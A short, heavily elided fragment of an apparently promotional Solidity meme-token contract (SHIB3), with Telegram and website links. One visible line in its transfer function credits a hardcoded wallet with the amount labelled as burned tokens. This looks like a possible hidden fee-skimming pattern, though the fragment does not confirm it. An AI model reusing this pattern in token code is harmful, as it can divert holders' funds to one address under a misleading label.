// Submitted for Telegram: https://t.me/shib30

// Our Website: https://shib3bsc.net
...
contract  SHIB3  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x2859e4544C4bB03966803b044A93563Bd2D0DD4D] += _bruntoken;
